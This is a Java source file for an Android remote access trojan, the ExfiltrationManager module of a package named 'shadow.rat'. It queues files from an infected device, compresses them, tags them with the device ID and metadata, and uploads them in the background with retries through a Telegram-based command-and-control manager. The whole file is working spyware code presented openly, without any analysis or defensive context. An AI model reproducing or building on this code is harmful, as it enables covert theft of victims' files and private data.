package com.shadow.rat.exfiltration;

import android.content.Context;
import android.util.Log;
import com.shadow.rat.c2.TelegramC2Manager;
import com.shadow.rat.persistence.ConfigManager;
import com.shadow.rat.utils.Logger;
import com.shadow.rat.utils.ThreadPoolManager;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class ExfiltrationManager {
    private static final String TAG = "ExfiltrationManager";
    private static volatile ExfiltrationManager instance;
    private final Context context;
    private final TelegramC2Manager c2Manager;
    private final ConfigManager configManager;
    private final BlockingQueue<UploadTask> uploadQueue = new LinkedBlockingQueue<>();
    private final AtomicBoolean running = new AtomicBoolean(true);
    
    public static ExfiltrationManager getInstance(Context context) {
        if (instance == null) {
            synchronized (ExfiltrationManager.class) {
                if (instance == null) {
                    instance = new ExfiltrationManager(context);
                }
            }
        }
        return instance;
    }
    
    private ExfiltrationManager(Context context) {
        this.context = context.getApplicationContext();
        this.c2Manager = TelegramC2Manager.getInstance(context);
        this.configManager = new ConfigManager(context);
        startUploadProcessor();
    }
    
    public void queueFileUpload(String filePath, String mimeType) {
        queueFileUpload(filePath, mimeType, null);
    }
    
    public void queueFileUpload(String filePath, String mimeType, String metadata) {
        File file = new File(filePath);
        if (!file.exists()) {
            Logger.e(TAG, "File not found: " + filePath);
            return;
        }
        
        try {
            UploadTask task = new UploadTask(
                filePath,
                file.getName(),
                mimeType,
                file.length(),
                metadata,
                configManager.getDeviceId()
            );
            uploadQueue.offer(task);
            Logger.d(TAG, "Queued file for upload: " + file.getName());
        } catch (Exception e) {
            Logger.e(TAG, "Failed to queue file upload", e);
        }
    }
    
    private void startUploadProcessor() {
        ThreadPoolManager.getExecutorService().execute(() -> {
            while (running.get()) {
                try {
                    UploadTask task = uploadQueue.poll(5, TimeUnit.SECONDS);
                    if (task != null) {
                        processUpload(task);
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Logger.e(TAG, "Upload processing error", e);
                }
            }
        });
    }
    
    private void processUpload(UploadTask task) {
        try {
            // Compress if needed
            String compressedPath = task.filePath;
            if (task.fileSize > 1024 * 1024) { // > 1MB
                compressedPath = CompressionManager.compressFile(context, task.filePath);
                if (compressedPath != null) {
                    task.filePath = compressedPath;
                    task.fileSize = new File(compressedPath).length();
                }
            }
            
            // Add metadata
            String enrichedPath = MetadataEnricher.enrichFile(context, task, compressedPath);
            
            // Upload with retry
            boolean success = uploadWithRetry(enrichedPath, task);
            
            if (success) {
                Logger.d(TAG, "Upload completed: " + task.originalName);
                // Cleanup original file if compressed
                if (compressedPath != null && !compressedPath.equals(task.filePath)) {
                    new File(compressedPath).delete();
                }
            } else {
                Logger.e(TAG, "Upload failed: " + task.originalName);
                // Requeue for later
                uploadQueue.offer(task);
            }
            
        } catch (Exception e) {
            Logger.e(TAG, "Upload processing failed", e);
        }
    }
    
    private boolean uploadWithRetry(String filePath, UploadTask task) {
        int maxRetries = 3;
        int retryDelay = 2000;
        
        for (int attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                // Upload using Telegram
                boolean success = c2Manager.uploadFile(filePath, task);
                if (success) {
                    return true;
                }
                
                // Wait before retry
                Thread.sleep(retryDelay * attempt);
                
            } catch (Exception e) {
                Logger.e(TAG, "Upload attempt " + attempt + " failed", e);
            }
        }
        return false;
    }
    
    public void shutdown() {
        running.set(false);
    }
    
    private static class UploadTask {
        String filePath;
        final String originalName;
        final String mimeType;
        long fileSize;
        final String metadata;
        final String deviceId;
        
        UploadTask(String filePath, String originalName, String mimeType, 
                   long fileSize, String metadata, String deviceId) {
            this.filePath = filePath;
            this.originalName = originalName;
            this.mimeType = mimeType;
            this.fileSize = fileSize;
            this.metadata = metadata;
            this.deviceId = deviceId;
        }
    }
}